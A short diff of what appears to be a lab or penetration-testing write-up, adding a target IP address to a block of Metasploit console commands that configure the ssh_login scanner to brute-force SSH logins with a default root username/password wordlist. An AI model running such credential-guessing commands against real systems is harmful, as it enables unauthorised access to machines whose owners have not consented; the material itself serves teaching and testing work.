@@ -270,6 +270,7 @@ msfconsole
 
 ```bash
 use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.230.83.3
 set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
 set STOP_ON_SUCCESS true
 set VERBOSE true
